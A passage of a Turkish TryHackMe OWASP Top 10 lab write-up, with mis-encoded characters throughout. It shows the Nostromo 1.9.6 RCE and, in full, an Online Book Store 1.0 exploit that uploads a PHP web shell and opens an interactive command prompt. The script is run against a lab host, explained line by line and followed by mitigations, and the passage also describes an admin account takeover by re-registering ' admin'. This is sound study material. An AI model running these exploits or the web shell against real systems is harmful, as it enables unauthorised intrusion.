BayraÄŸÄ± yakaladÄ±k: `THM{Just_a_tiny_misconfiguration}`. Bu bir veritabanÄ± gizli linki de olabilirdi. 

## GÃ¶rev 13: ğŸ›‘ Vulnerable and Outdated Components

Bazen, bir ÅŸirketin veya kuruluÅŸun penetrasyon testi (sÄ±zma testi) yaparken, kullandÄ±klarÄ± bir programÄ±n iyi bilinen bir gÃ¼venlik aÃ§Ä±ÄŸÄ±na sahip olduÄŸunu fark edebilirsiniz.

Ã–rneÄŸin, bir ÅŸirketin WordPress sÃ¼rÃ¼mÃ¼nÃ¼ birkaÃ§ yÄ±ldÄ±r gÃ¼ncellemediÄŸini varsayalÄ±m. [WPScan](https://wpscan.com/) gibi bir araÃ§ kullanarak, sitenin WordPress 4.6 sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± tespit edebilirsiniz. KÄ±sa bir araÅŸtÄ±rma yaptÄ±ÄŸÄ±nÄ±zda, WordPress 4.6â€™nÄ±n kimlik doÄŸrulamasÄ± gerektirmeyen bir uzaktan kod Ã§alÄ±ÅŸtÄ±rma (RCE) aÃ§Ä±ÄŸÄ±na sahip olduÄŸunu Ã¶ÄŸrenirsiniz. Daha da iyisi, bu aÃ§Ä±k iÃ§in hazÄ±r bir exploitâ€™i [Exploit-DB](https://www.exploit-db.com/exploits/41962) adresinde bulabilirsiniz.

GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, bu durum oldukÃ§a ciddi bir tehlike yaratÄ±r Ã§Ã¼nkÃ¼ saldÄ±rganÄ±n Ã§ok az Ã§aba sarf etmesi yeterlidir. AÃ§Ä±k zaten iyi bilindiÄŸi iÃ§in, bÃ¼yÃ¼k olasÄ±lÄ±kla baÅŸka biri bu gÃ¼venlik aÃ§Ä±ÄŸÄ± iÃ§in bir exploit geliÅŸtirmiÅŸtir. Ä°ÅŸler, bÃ¶yle bir durumun ne kadar kolay gerÃ§ekleÅŸebileceÄŸini dÃ¼ÅŸÃ¼ndÃ¼ÄŸÃ¼nÃ¼zde daha da kÃ¶tÃ¼leÅŸir. EÄŸer bir ÅŸirket, kullandÄ±ÄŸÄ± bir programÄ±n tek bir gÃ¼ncellemesini bile kaÃ§Ä±rÄ±rsa, bu program sayÄ±sÄ±z saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z hale gelebilir.

## GÃ¶rev 14: Vulnerable and Outdated Components - SÃ¶mÃ¼rÃ¼ (Exploit)

Bilinen gÃ¼venlik aÃ§Ä±klarÄ±yla ilgili olduÄŸundan, iÅŸin Ã§oÄŸu zaten bizim iÃ§in yapÄ±lmÄ±ÅŸ durumda. Ana gÃ¶revimiz, kullanÄ±lan yazÄ±lÄ±mÄ±n bilgilerini bulmak ve bir exploit (istismar kodu) bulana kadar araÅŸtÄ±rmak. Bunu bir Ã¶rnek web uygulamasÄ±yla adÄ±m adÄ±m inceleyelim.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/79310c575c9809b1ac8e8546badb2d34.png)

### Nostromo 1.9.6

BakÄ±n ne bulduk! Bu sunucu, Nostromo web sunucusunun varsayÄ±lan sayfasÄ±nÄ± kullanÄ±yor. ArtÄ±k elimizde bir sÃ¼rÃ¼m numarasÄ± (1.9.6) ve bir yazÄ±lÄ±m adÄ± var. Åimdi [Exploit-DB](https://www.exploit-db.com/) sitesini kullanarak bu sÃ¼rÃ¼m iÃ§in bir exploit bulmaya Ã§alÄ±ÅŸabiliriz.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/146fb6d0c48ef46d94f124921da171cc.png)

ÅanslÄ±yÄ±z, en Ã¼stteki sonuÃ§ bir exploit betiÄŸi. Hadi bunu indirelim ve kod Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim. BetiÄŸi doÄŸrudan Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda Ã§ok Ã¶nemli bir ders Ã¶ÄŸreniyoruz:

```bash
user@linux$ python 47837.py
Traceback (most recent call last):
  File "47837.py", line 10, in <module>
    cve2019_16278.py
NameError: name 'cve2019_16278' is not defined
```

Ä°nternetten indirdiÄŸiniz exploitler her zaman ilk seferde Ã§alÄ±ÅŸmayabilir. BetiÄŸin yazÄ±ldÄ±ÄŸÄ± programlama dilini anlamak faydalÄ±dÄ±r; bÃ¶ylece gerekirse hatalarÄ± dÃ¼zeltebilir veya deÄŸiÅŸiklikler yapabilirsiniz. Exploit-DBâ€™deki pek Ã§ok betik, sizin bazÄ± dÃ¼zenlemeler yapmanÄ±zÄ± bekler.

Neyse ki, bu hata, yorum satÄ±rÄ± olmasÄ± gereken bir satÄ±rdan kaynaklanÄ±yor. Bu yÃ¼zden dÃ¼zeltmesi kolay:

```python
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

cve2019_16278.py  # This line needs to be commented.

#!/usr/bin/env python
```

Bu dÃ¼zeltmeyi yaptÄ±ktan sonra programÄ± tekrar Ã§alÄ±ÅŸtÄ±ralÄ±m:

```bash
user@linux$ python2 47837.py 127.0.0.1 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Fri, 03 Feb 2023 04:58:34 GMT
Server: nostromo 1.9.6
Connection: close

uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
```

Ä°ÅŸte oldu! Uzaktan kod Ã§alÄ±ÅŸtÄ±rma (RCE) elde ettik. Åunu unutmayÄ±n: Ã‡oÄŸu betik, Ã§alÄ±ÅŸtÄ±rmak iÃ§in hangi parametreleri vermeniz gerektiÄŸini size sÃ¶yler. Exploit geliÅŸtiricileri, nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± anlamanÄ±z iÃ§in yÃ¼zlerce satÄ±r kodu okumanÄ±zÄ± nadiren bekler.

AyrÄ±ca ÅŸunu da belirtelim: Her zaman bu kadar kolay olmayabilir. Bazen, bu Ã¶rnekte olduÄŸu gibi sadece bir sÃ¼rÃ¼m numarasÄ± bulursunuz. Ancak diÄŸer durumlarda HTML kaynak kodunu incelemeniz veya exploit betiÄŸi iÃ§in tahminde bulunmanÄ±z gerekebilir. Yine de, eÄŸer bilinen bir gÃ¼venlik aÃ§Ä±ÄŸÄ±ysa, uygulamanÄ±n hangi sÃ¼rÃ¼mde Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± keÅŸfetmenin genellikle bir yolu vardÄ±r.

Ä°ÅŸte bu kadar! OWASP Top 10â€™un bu maddesinin en gÃ¼zel yanÄ±, iÅŸin bÃ¼yÃ¼k kÄ±smÄ±nÄ±n zaten yapÄ±lmÄ±ÅŸ olmasÄ±. Bizim yapmamÄ±z gereken tek ÅŸey biraz temel araÅŸtÄ±rma; zaten bir sÄ±zma testÃ§isi olarak bunu sÄ±kÃ§a yapÄ±yorsunuz. DeÄŸil mi?

## GÃ¶rev 15: GÃ¼venlik AÃ§Ä±ÄŸÄ± Olan ve GÃ¼ncellenmemiÅŸ BileÅŸenler - Laboratuvar

### Bayrak Yakalamaca

- TryHackMe saÃ§ma sapan bir maddeleme kafasÄ±na sahip olduÄŸu iÃ§in bu baÅŸlÄ±k altÄ±nda makinayÄ± deneyeceÄŸiz. 84 portuna gidelim:

  ![](https://i.ibb.co/Dgpzx1VF/15-1.png)

- Online kitap satÄ±ÅŸ noktasÄ±? gibi bir ÅŸey yapmaya Ã§abalamÄ±ÅŸ bu arkadaÅŸ. Ancak acemi gÃ¶rÃ¼nÃ¼yor Ã§Ã¼nkÃ¼ satÄ±n? aldÄ±ÄŸÄ± kodu dÃ¼zenlemeden direkt yÃ¼klemiÅŸ. Sitenin baÅŸlÄ±ÄŸÄ± hala CSE Bookstore olarak duruyor. Webde aÃ§Ä±k aramaya Ã§abalayalÄ±m:

  ![](https://i.ibb.co/N6hf9jS9/15-2.png)

- Bir exploit bulduk. [Online Book Store 1.0 - Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/47887) 

  ```python
  # Exploit Title: Online Book Store 1.0 - Unauthenticated Remote Code Execution
  # Google Dork: N/A
  # Date: 2020-01-07
  # Exploit Author: Tib3rius
  # Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-book-store-project-in-php/
  # Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip
  # Version: 1.0
  # Tested on: Ubuntu 16.04
  # CVE: N/A

  import argparse
  import random
  import requests
  import string
  import sys

  parser = argparse.ArgumentParser()
  parser.add_argument('url', action='store', help='The URL of the target.')
  args = parser.parse_args()

  url = args.url.rstrip('/')
  random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))

  payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'

  file = {'image': (random_file + '.php', payload, 'text/php')}
  print('> Attempting to upload PHP web shell...')
  r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
  print('> Verifying shell upload...')
  r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)

  if random_file in r.text:
      print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
      print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
      launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
      if launch_shell.lower() == 'y':
          while True:
              cmd = str(input('RCE $ '))
              if cmd == 'exit':
                  sys.exit(0)
              r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
              print(r.text)
  else:
      if r.status_code == 200:
          print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
      else:
          print('> Web shell failed to upload! The web server may not have write permissions.')
  ```

- Denemeye baÅŸlayalÄ±m. Ã–nce exploiti indirelim:

  ![](https://i.ibb.co/0y2L4ppT/15-3.png)

- Åimdi Ã§alÄ±ÅŸtÄ±rmaya Ã§abalayalÄ±m:

  ![alt text](https://i.ibb.co/ynCMdRCH/15-4.png)

  ```bash
  â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads]
  â””â”€$ python3                                
  Python 3.12.8 (main, Feb  1 2025, 21:32:22) [GCC 14.2.0] on linux
  Type "help", "copyright", "credits" or "license" for more information.
  >>> exit
  Use exit() or Ctrl-D (i.e. EOF) to exit
  >>> exit()
                                                                                                                              
  â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads]
  â””â”€$ python3 47887.py http://10.10.245.228:84/
  > Attempting to upload PHP web shell...
  > Verifying shell upload...
  > Web shell uploaded to http://10.10.245.228:84/bootstrap/img/i2UTHQZO22.php
  > Example command usage: http://10.10.245.228:84/bootstrap/img/i2UTHQZO22.php?cmd=whoami
  > Do you wish to launch a shell here? (y/n): y
  RCE $ id
  uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)

  RCE $ cat /opt/flag.txt 
  THM{But_1ts_n0t_my_f4ult!}

  RCE $ 
  ```

  1. **`python3 47887.py http://10.10.245.228:84/`**  
    Bu komut, `47887.py` adlÄ± Python betiÄŸini Ã§alÄ±ÅŸtÄ±rarak belirtilen URL'ye (http://10.10.245.228:84/) baÄŸlanÄ±r ve uzaktaki web sunucusuna bir PHP web shell (web kabuÄŸu) yÃ¼klemeyi dener.

  2. **`Attempting to upload PHP web shell...`**  
    Python betiÄŸi, belirtilen hedef URL'ye PHP web shell yÃ¼klemeyi dener.

  3. **`Verifying shell upload...`**  
    Betik, PHP shell'in baÅŸarÄ±lÄ± bir ÅŸekilde yÃ¼klendiÄŸinden emin olmak iÃ§in kontrol eder.

  4. **`Web shell uploaded to http://10.10.245.228:84/bootstrap/img/i2UTHQZO22.php`**  
    PHP web shell, belirtilen dizine (bootstrap/img/) baÅŸarÄ±lÄ± bir ÅŸekilde yÃ¼klenmiÅŸtir. Burada `i2UTHQZO22.php` adÄ±nda bir dosya oluÅŸturulmuÅŸtur.

  5. **`Example command usage: http://10.10.245.228:84/bootstrap/img/i2UTHQZO22.php?cmd=whoami`**  
    YÃ¼klenen PHP shell Ã¼zerinden, komut Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lacak Ã¶rnek bir URL saÄŸlanÄ±r. `cmd=whoami` komutu, kullanÄ±cÄ±nÄ±n kimliÄŸini Ã¶ÄŸrenmek iÃ§in Ã§alÄ±ÅŸtÄ±rÄ±labilir.

  6. **`Do you wish to launch a shell here? (y/n): y`**  
    PHP shell Ã¼zerinden bir komut satÄ±rÄ± baÅŸlatmak istenip istenmediÄŸi sorulur. Burada "y" (yes) seÃ§ilerek komut satÄ±rÄ± baÅŸlatÄ±lÄ±r.

  7. **`RCE $ id`**  
    Komut satÄ±rÄ±nda `id` komutu Ã§alÄ±ÅŸtÄ±rÄ±larak uzaktaki sistemdeki kullanÄ±cÄ± bilgileri alÄ±nÄ±r. Ã‡Ä±ktÄ± ÅŸu ÅŸekildedir:  
    `uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)`  
    Burada Apache web sunucusu kullanÄ±cÄ±sÄ±nÄ±n kimlik bilgileri gÃ¶sterilmektedir.

  8. **`RCE $ cat /opt/flag.txt`**  
    `/opt/flag.txt` dosyasÄ±nÄ±n iÃ§eriÄŸi okunur. Bu, bir "flag" (bayrak) dosyasÄ±na eriÅŸim saÄŸlayarak, verilen Ã¶dÃ¼l metnini (bu durumda "THM{But_1ts_n0t_my_f4ult!}") elde eder.

  BÃ¶ylece hedef makinaya uzaktan komut Ã§alÄ±ÅŸtÄ±rarak (RCE - Remote Code Execution) Ã¶nemli bilgilere ulaÅŸtÄ±k: `THM{But_1ts_n0t_my_f4ult!}` olarak yakaladÄ±k. Remote Code Execution. AklÄ±nda tut unutma.

### Exploit Analizi: PHP Web Shell YÃ¼kleme

Bu exploit, hedef web sunucusuna **PHP tabanlÄ± bir web shell yÃ¼kleyerek uzaktan komut Ã§alÄ±ÅŸtÄ±rmayÄ± (RCE)** amaÃ§lamaktadÄ±r. AÅŸaÄŸÄ±da adÄ±m adÄ±m nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klÄ±yoruz:  

#### 1. Gerekli ModÃ¼llerin ve ArgÃ¼manlarÄ±n TanÄ±mlanmasÄ±  
```python
import argparse
import random
import requests
import string
import sys
```
- `argparse`: Komut satÄ±rÄ±ndan **URL** parametresini almak iÃ§in kullanÄ±lÄ±r.  
- `random` & `string`: Rastgele bir dosya adÄ± oluÅŸturmak iÃ§in kullanÄ±lÄ±r.  
- `requests`: HTTP isteklerini gÃ¶ndermek iÃ§in kullanÄ±lÄ±r.  
- `sys`: Shell aÃ§ma sÃ¼recini kontrol etmek iÃ§in kullanÄ±lÄ±r.  

#### 2. KullanÄ±cÄ±nÄ±n GirdiÄŸi URL'yi AlÄ±r ve Ä°ÅŸler
```python
parser = argparse.ArgumentParser()
parser.add_argument('url', action='store', help='The URL of the target.')
args = parser.parse_args()
url = args.url.rstrip('/')
```
- KullanÄ±cÄ±dan hedefin URL'sini alÄ±r.  
- `rstrip('/')` kullanÄ±larak URLâ€™nin sonunda `/` varsa kaldÄ±rÄ±lÄ±r.  

#### 3. Rastgele Bir PHP Dosya AdÄ± OluÅŸturulur
```python
random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))
```
- **10 karakterlik rastgele bir dosya adÄ±** oluÅŸturulur (Ã¶rneÄŸin, `aB3dEfG9H1.php`).  
- BÃ¶ylece exploit her Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda **farklÄ± bir dosya adÄ±yla yÃ¼kleme yapar**.  

#### 4. PHP Web Shell Payloadâ€™Ä± TanÄ±mlanÄ±r
```python
payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'
```
- PHP kodu iÃ§eren bir **web shell** oluÅŸturur.  
- **`shell_exec($_GET['cmd'])`** kullanarak URL Ã¼zerinden **komut Ã§alÄ±ÅŸtÄ±rmaya** izin verir.  
- Ã–rneÄŸin:  
  ```bash
  http://target.com/bootstrap/img/aB3dEfG9H1.php?cmd=whoami
  ```
  Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, hedef makinede **whoami** komutu Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r ve yanÄ±t olarak dÃ¶ndÃ¼rÃ¼lÃ¼r.  

#### 5. Web Shellâ€™i YÃ¼klemeye Ã‡alÄ±ÅŸÄ±r
```python
file = {'image': (random_file + '.php', payload, 'text/php')}
print('> Attempting to upload PHP web shell...')
r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
```
- **Hedef sitedeki dosya yÃ¼kleme aÃ§Ä±ÄŸÄ±nÄ± kullanarak** PHP kodunu iÃ§eren bir dosya yÃ¼kler.  
- `requests.post()` ile **`/admin_add.php`** sayfasÄ±na bir **HTTP POST isteÄŸi** gÃ¶nderilir.  
- `files` parametresi ile **PHP dosyasÄ±** resim dosyasÄ± gibi yollanÄ±r.  

> **Hedef sistemde dosya yÃ¼kleme filtreleri yoksa veya MIME-type kontrolÃ¼ yapÄ±lmÄ±yorsa, PHP kodu Ã§alÄ±ÅŸtÄ±rÄ±labilir.**  

#### 6. Web Shellâ€™in BaÅŸarÄ±yla YÃ¼klenip YÃ¼klenmediÄŸini Kontrol Eder
```python
print('> Verifying shell upload...')
r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)
```
- **Web shellâ€™in yÃ¼klendiÄŸi dizine bir GET isteÄŸi gÃ¶nderilir.**  
- `cmd=echo <random_file>` Ã§alÄ±ÅŸtÄ±rÄ±larak, yÃ¼klenen PHP dosyasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ± test edilir.  


#### 7. Web Shellâ€™in YÃ¼klenip YÃ¼klenmediÄŸini Analiz Eder
##### **BaÅŸarÄ±lÄ± Olursa:**
```python
if random_file in r.text:
    print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
    print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
```
- EÄŸer dÃ¶nen yanÄ±t iÃ§inde **random_file** varsa, bu **shellâ€™in Ã§alÄ±ÅŸtÄ±ÄŸÄ± anlamÄ±na gelir**.  
- KullanÄ±cÄ±ya baÅŸarÄ±lÄ± yÃ¼kleme bilgisi verilir.  

##### Shell KullanÄ±cÄ±dan Komut Bekler
```python
launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
if launch_shell.lower() == 'y':
    while True:
        cmd = str(input('RCE $ '))
        if cmd == 'exit':
            sys.exit(0)
        r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
        print(r.text)
```
- KullanÄ±cÄ± **shell baÅŸlatmak istiyor mu?** diye sorar.  
- `y` derse, **sonsuz dÃ¶ngÃ¼ye girer** ve kullanÄ±cÄ±nÄ±n girdiÄŸi komutlarÄ± Ã§alÄ±ÅŸtÄ±rÄ±r.  

#### 8. Web Shell BaÅŸarÄ±sÄ±z Olursa KullanÄ±cÄ±ya Bilgi Verir
```python
else:
    if r.status_code == 200:
        print('> Web shell uploaded, but command execution failed. Perhaps shell_exec is disabled? Try changing the payload.')
    else:
        print('> Web shell failed to upload! The web server may not have write permissions.')
```
- **HTTP 200 dÃ¶ndÃ¼ÄŸÃ¼ halde komut Ã§alÄ±ÅŸmazsa**, `shell_exec` veya diÄŸer PHP fonksiyonlarÄ±nÄ±n kÄ±sÄ±tlanmÄ±ÅŸ olabileceÄŸini belirtir.  
- **HTTP 200 dÃ¶nmezse**, sunucunun yazma izinlerinin kapalÄ± olabileceÄŸi veya dosya yÃ¼kleme iÅŸleminin baÅŸarÄ±sÄ±z olduÄŸu kullanÄ±cÄ±ya bildirilir.  

#### Ã–zet: Exploit Ne YapÄ±yor?
1. KullanÄ±cÄ±dan hedef URLâ€™yi alÄ±r.  
2. **10 karakterlik rastgele bir dosya adÄ± oluÅŸturur.**  
3. PHP **web shell payloadâ€™Ä±nÄ±** tanÄ±mlar.  
4. **Dosya yÃ¼kleme aÃ§Ä±ÄŸÄ± bulunan `/admin_add.php` sayfasÄ±na** PHP kodunu yÃ¼kler.  
5. **YÃ¼klenen shellâ€™in Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrular.**  
6. Shell baÅŸarÄ±yla Ã§alÄ±ÅŸÄ±yorsa **interaktif olarak komut Ã§alÄ±ÅŸtÄ±rmaya izin verir.**  

#### Bu AÃ§Ä±ÄŸa KarÅŸÄ± Korunma YÃ¶ntemleri
âœ… **Dosya yÃ¼kleme gÃ¼venliÄŸi saÄŸlanmalÄ±:**  
   - `MIME-type` ve uzantÄ± doÄŸrulamasÄ± yapÄ±lmalÄ±.  
   - `.php` veya `.phtml` gibi uzantÄ±lar **kesinlikle** engellenmeli.  
   - `exif_imagetype()` ve `getimagesize()` gibi fonksiyonlarla **dosyanÄ±n gerÃ§ekten bir resim olup olmadÄ±ÄŸÄ± doÄŸrulanmalÄ±.**  

âœ… **Dosya yÃ¼kleme dizinine Ã§alÄ±ÅŸtÄ±rma (execute) izni verilmemeli:**  
   - Sunucunun `/bootstrap/img/` gibi dizinlerinde `.php` dosyalarÄ±nÄ±n **Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± yasaklanmalÄ±.**  
   - Apache iÃ§in `.htaccess` kullanarak:  
     ```
     <Directory "/var/www/html/uploads">
         Options -ExecCGI
         AddHandler cgi-script .php .phtml
         Deny from all
     </Directory>
     ```  

âœ… **PHPâ€™de `shell_exec()` gibi fonksiyonlar kapatÄ±lmalÄ±:**  
   - `php.ini` dosyasÄ±nda ÅŸu satÄ±r eklenmeli:  
     ```ini
     disable_functions = shell_exec, exec, system, passthru, popen, proc_open
     ```  

âœ… **Web uygulamalarÄ±nda gÃ¼venli kimlik doÄŸrulama kullanÄ±lmalÄ±:**  
   - `/admin_add.php` sayfasÄ± **sadece yetkili kullanÄ±cÄ±lar tarafÄ±ndan eriÅŸilebilir** olmalÄ±.  
   - GÃ¼Ã§lÃ¼ parolalar ve **iki faktÃ¶rlÃ¼ kimlik doÄŸrulama (2FA)** uygulanmalÄ±.  

## GÃ¶rev 16: ğŸ›‘ Identification and Authentication Failures

![Kimlik DoÄŸrulama HatalarÄ±](https://i.ibb.co/C3yHGCxw/16-1.png)

### Kimlik DoÄŸrulama ve Oturum YÃ¶netimi Nedir?

Kimlik doÄŸrulama ve oturum yÃ¶netimi, modern web uygulamalarÄ±nÄ±n temel bileÅŸenleridir. Kimlik doÄŸrulama, kullanÄ±cÄ±larÄ±n kimliklerini doÄŸrulayarak web uygulamalarÄ±na eriÅŸmelerini saÄŸlar. En yaygÄ±n kimlik doÄŸrulama yÃ¶ntemi, kullanÄ±cÄ± adÄ± ve parola kullanmaktÄ±r. KullanÄ±cÄ± bu bilgileri girer, sunucu bunlarÄ± kontrol eder ve eÄŸer doÄŸruysa, kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±na bir *oturum Ã§erezi* (session cookie) gÃ¶nderir.

Oturum Ã§erezine ihtiyaÃ§ duyulmasÄ±nÄ±n sebebi, web sunucularÄ±nÄ±n *HTTP(S)* protokolÃ¼yle iletiÅŸim kurmasÄ±dÄ±r. Bu protokol *durumsuz* (stateless) bir yapÄ±dadÄ±r, yani her istek birbirinden baÄŸÄ±msÄ±zdÄ±r. Oturum Ã§erezleri sayesinde sunucu, hangi kullanÄ±cÄ±nÄ±n hangi veriyi gÃ¶nderdiÄŸini takip edebilir. BÃ¶ylece kullanÄ±cÄ±larÄ±n uygulama iÃ§indeki eylemleri izlenebilir hale gelir.

### Kimlik DoÄŸrulama HatalarÄ±nÄ±n Riskleri

EÄŸer bir saldÄ±rgan, kimlik doÄŸrulama mekanizmasÄ±nda bir zayÄ±flÄ±k bulursa, diÄŸer kullanÄ±cÄ±larÄ±n hesaplarÄ±na eriÅŸebilir. Bu, saldÄ±rganÄ±n hassas verilere ulaÅŸmasÄ±na olanak tanÄ±r (uygulamanÄ±n amacÄ±na baÄŸlÄ± olarak). Kimlik doÄŸrulama mekanizmalarÄ±ndaki yaygÄ±n hatalar ÅŸunlardÄ±r:

- **Kaba Kuvvet SaldÄ±rÄ±larÄ± (Brute Force Attacks):** EÄŸer bir web uygulamasÄ± kullanÄ±cÄ± adÄ± ve parola kullanÄ±yorsa, bir saldÄ±rgan Ã§ok sayÄ±da deneme yaparak bu bilgileri tahmin etmeye Ã§alÄ±ÅŸabilir.
- **ZayÄ±f Kimlik Bilgileri KullanÄ±mÄ±:** Web uygulamalarÄ± gÃ¼Ã§lÃ¼ parola politikalarÄ± uygulamalÄ±dÄ±r. EÄŸer kullanÄ±cÄ±lar "parola1" gibi basit veya yaygÄ±n parolalar seÃ§ebiliyorsa, saldÄ±rganlar bunlarÄ± kolayca tahmin edebilir ve hesaplara eriÅŸebilir.
- **ZayÄ±f Oturum Ã‡erezleri:** Oturum Ã§erezleri, sunucunun kullanÄ±cÄ±larÄ± tanÄ±masÄ±nÄ± saÄŸlar. EÄŸer bu Ã§erezler Ã¶ngÃ¶rÃ¼lebilir deÄŸerler iÃ§eriyorsa, saldÄ±rganlar kendi Ã§erezlerini oluÅŸturup kullanÄ±cÄ± hesaplarÄ±na girebilir.

### Kimlik DoÄŸrulama HatalarÄ±nÄ± Ã–nleme YÃ¶ntemleri

Kimlik doÄŸrulama mekanizmalarÄ±ndaki hatalarÄ± gidermek iÃ§in alÄ±nabilecek Ã¶nlemler, sorunun tÃ¼rÃ¼ne gÃ¶re deÄŸiÅŸir:

- **Parola Tahmin SaldÄ±rÄ±larÄ±nÄ± Ã–nlemek Ä°Ã§in:** UygulamanÄ±n gÃ¼Ã§lÃ¼ bir parola politikasÄ± uyguladÄ±ÄŸÄ±ndan emin olun. Ã–rneÄŸin, karmaÅŸÄ±k ve uzun parolalar zorunlu kÄ±lÄ±nabilir.
- **Kaba Kuvvet SaldÄ±rÄ±larÄ±nÄ± Engellemek Ä°Ã§in:** Uygulama, belirli bir deneme sayÄ±sÄ±ndan sonra hesabÄ± otomatik olarak kilitlemelidir. Bu, saldÄ±rganÄ±n daha fazla tahmin yapmasÄ±nÄ± zorlaÅŸtÄ±rÄ±r.
- **Ã‡ok FaktÃ¶rlÃ¼ Kimlik DoÄŸrulama (MFA):** KullanÄ±cÄ±larÄ±n birden fazla doÄŸrulama yÃ¶ntemi kullanmasÄ± saÄŸlanabilir. Ã–rneÄŸin, kullanÄ±cÄ± adÄ± ve parola ile birlikte cep telefonuna gelen bir kod istenebilir. Bu durumda, bir saldÄ±rganÄ±n hem parolayÄ± hem de kodu ele geÃ§irmesi Ã§ok daha zor olur.

## GÃ¶rev 17: Kimlik DoÄŸrulama MekanizmasÄ±ndaki MantÄ±k HatasÄ±

Bu Ã¶rnekte, kimlik doÄŸrulama mekanizmasÄ±ndaki bir mantÄ±k hatasÄ±nÄ± inceleyeceÄŸiz.

### GeliÅŸtirici HatalarÄ±ndan Kaynaklanan Zafiyetler

Ã‡oÄŸu zaman, geliÅŸtiriciler kullanÄ±cÄ±dan gelen girdileri (kullanÄ±cÄ± adÄ± ve parola gibi) uygulama kodunda dÃ¼zgÃ¼n bir ÅŸekilde temizlemeyi (sanitization) unutur. Bu durum, uygulamayÄ± *SQL enjeksiyonu* gibi saldÄ±rÄ±lara karÅŸÄ± savunmasÄ±z hale getirebilir. Ancak bu sefer, geliÅŸtirici hatasÄ±ndan kaynaklanan ve sÃ¶mÃ¼rÃ¼lmesi Ã§ok kolay olan farklÄ± bir zafiyete odaklanacaÄŸÄ±z: mevcut bir kullanÄ±cÄ±nÄ±n yeniden kaydolmasÄ±.

### Ã–rnekle Anlama

Bu durumu bir Ã¶rnekle aÃ§Ä±klayalÄ±m. Diyelim ki `admin` adÄ±nda mevcut bir kullanÄ±cÄ± var ve biz bu hesaba eriÅŸmek istiyoruz. YapabileceÄŸimiz ÅŸey, bu kullanÄ±cÄ± adÄ±nÄ± ufak bir deÄŸiÅŸiklikle yeniden kaydettirmeye Ã§alÄ±ÅŸmak. Ã–rneÄŸin, tÄ±rnak iÅŸaretleri olmadan " admin" (baÅŸÄ±nda boÅŸluk olduÄŸuna dikkat edin) ÅŸeklinde bir kullanÄ±cÄ± adÄ± girebiliriz. Bu kullanÄ±cÄ± adÄ±nÄ± girip, gerekli diÄŸer bilgileri (Ã¶rneÄŸin e-posta adresi veya parola) doldurduktan sonra formu gÃ¶nderdiÄŸimizde, yeni bir kullanÄ±cÄ± kaydolur. Ancak bu yeni kullanÄ±cÄ±, `admin` hesabÄ±yla aynÄ± yetkilere sahip olur ve `admin` kullanÄ±cÄ±sÄ±na sunulan tÃ¼m iÃ§eriÄŸi gÃ¶rebilir.

### UygulamalÄ± Ã–rnek

